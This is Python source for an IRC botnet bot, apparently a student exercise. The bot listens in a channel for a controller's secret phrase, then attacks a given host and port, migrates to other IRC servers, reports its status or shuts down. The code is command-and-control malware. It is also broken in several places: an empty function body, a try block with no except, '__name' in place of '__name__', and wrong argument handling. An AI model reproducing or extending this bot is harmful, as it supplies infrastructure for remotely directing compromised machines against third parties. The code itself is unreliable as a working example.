import time
import socket
import sys
import random 

HOST = None
PORT = None 
CHANNEL = None 
PHRASE = None 
IRC = None
CONTROLLER_FLAG = True 
IRCSOCKET = None


# BOT REQUIREMENTS
# Listen on channel and detect secret phrase from controller
# Execute commands sent by controller to channel
# Commands: Network attack, migration to different IRC, ShutDown
# Report status of command execution to controller
# IMPLEMENT PINGPONG: https://linuxacademy.com/blog/geek/creating-an-irc-bot-with-python3/

# CONTROLLER INFO
conNick = None 
conFlag = True #Check if controller is active

# BOT INFO
attackCounter = 0
botNick = "IRCBOT "
shutdownStatus = False # Only set to true if shutdown command is called

# BOT JOINS A CHANNEL
# https://pythonspot.com/en/building-an-irc-bot/
def joinIRC(IRCSOCKET, CHANNEL):
    global botNick
    botNick = botNick + str(random.randrange(10000))
    sendMsg(IRCSOCKET, "USER " + botNick + " " + botNick + " " + botNick + ": Connecting to server\n")
    sendMsg(IRCSOCKET, "NICK " + botNick + "\n")
    sendMsg(IRCSOCKET, "JOIN " + CHANNEL + "\n")

# THESE ARE THE FUNCTIONS FOR THE COMMANDS
def getStatus():    
    # Send botNick to controller. Also the attackCounter

# Attack a host 
# Increment counter if attack is successful
# Message controller if successful
def cmdAttack(conNick, host, port):
    global attackCounter, botNick, conNick
    # Initialize attack
    try:
        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target.connect((host,port))
        msg = bytes(str(attackCounter) + " " + botNick + "\n", 'utf-8')
        target.send(msg)
        sendPrivate(botNick + " attack successful", conNick)
        attackCounter = attackCounter + 1
        return True 
    except:
        sendPrivate(botNick + " attack unsuccessful", conNick)
        return False 

# Move to a different IRC server/channel
def cmdMove(conNick, host, port, channel):
    global HOST, PORT, CHANNEL, IRCSOCKET
    
    # Attempt new connection 
    # Connect with the values passed in
    # If successful, close global, passed values are now the global
    try:
        newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connectionFlag = serverConnect(newSocket, host, port)
        if connectionFlag != False:
            # Connection is succesful
            # Send Private Msg to Controller for status (pass for now)
            pass 
            # Close original connection
            IRCSOCKET.close()
            # RESET GLOBAL TO NEW VALUES
            HOST = host 
            PORT = port 
            CHANNEL = channel 
            IRCSOCKET = newSocket 
            return True 
        else:
            # Send Failure message to controller 
            print("ERROR: Cannot enter new IRC server")
            return False 
    except:
        # Send Failure message to controller
        print("ERROR: Cannot enter new IRC server")
        return False 

def cmdQuit():
    pass

def cmdShutdown():
    global shutdownStatus 
    shutdownStatus = True 
    # Tell controller that the bot is shutting down 
    return shutdownStatus 

# SEND PRIVATE MESSAGE TO CONTROLLER
def sendPrivate(conNick, msg):
    # Send private message to Controller
    sock.send(IRCSOCKET, "PRIVMSG " + conNick + " :" + msg + "\n")
    return

# SEND MESSAGE TO IRC
def sendMsg(sock, msg):
    msg = msg.encode('utf-8')
    sock.send(msg)


# GET COMMANDS FROM CONTROLLER AKA READ IRC MESSAGES
def getCommand(IRCSOCKET):
    msg = IRCSOCKET.recv(1024).decode('utf-8').strip()
    if msg == "":
        return False
    else:
        # Keep sending PONG to let controller bot is still alive
        # https://pythonspot.com/en/building-an-irc-bot/
        if msg.find('PING') != -1: 
            sendMsg('PONG ' + msg.split()[1] + '\r\n')
        return msg

# DO COMMANDS
def commandHandler():




    # THE CODE BELOW STILL HAS TO BE INDENTED ONE TAB TO THE RIGHT
    # Get Commands
    # status, attack <host><port>, move<host><port><channel>, quit, shutdown
    command = getCommand(IRCSOCKET)
    command = command.split() #split msg from return

    if command != False:
        try:
            # Check if secretPhrase has been said at the end
            if command(len(command) - 1) == PHRASE:
                # Check for commands if secretPhrase has been said 

                # Get status of bot
                if command == "status":
                    print("Command: status")
                    cmdStatus = getStatus()
                    print(str(status))

                # Start attack
                elif command == "attack":
                    try:
                        host = command[1]
                        port = command[2]
                        print("Command: attack " + str(host) + " " + str(port))
                        cmdAttack(host, port)
                    except:
                        pass

                # Move to another IRC channel
                elif command == "move":
                    try:
                        host = command[1]
                        port = command[2]
                        channel = command[3]
                        cmdMove(host, port, channel)
                        print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
                elif command == "quit":
                    cmdQuit()
                elif command == "shutdown":
                    cmdShutdown()
        except:
            # No valid command given
            pass

# THIS IS WHERE ALL THE COMMUNICATION STUFF HAPPENS

# CONNECT TO IRC SERVER CHANNEL
# This next line goes to a function
# ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def serverConnect(IRCSOCKET, host, port):
    try:
        IRCSOCKET.connect((host,port))
        print("Connection successful")
        return True
    except:
        print("Connection failed")
        return False 




if __name == "__main__":

    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET 
    # Get sys.args
    if len(sys.argv) != 4:
        print("Wrong number of inputs")
        sys.exit()

    HOST = sys.argv[0]
    PORT = sys.argv[1]
    CHANNEL = sys.argv[2]
    PHRASE = sys.argv[3]

    if not PORT.isdigit():
        print("Invalid port")
        sys.exit()

    # Initial Connection + Join channel
    try:
        IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print("Unable to initially connect to IRC server")
        sys.exit() 

    joinIRC(IRCSOCKET, CHANNEL)

    # Keep Connection to IRC Server
    while True:
        IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Do connection stuff
        connectionFlag = serverConnect(ircSocket, HOST, PORT)
        while connectionFlag:
            # This is the main part of the code
            # Keep looking if it's connected and if it is, 
            # keep reading messages from IRC server
            commandHandler()
            
        

        


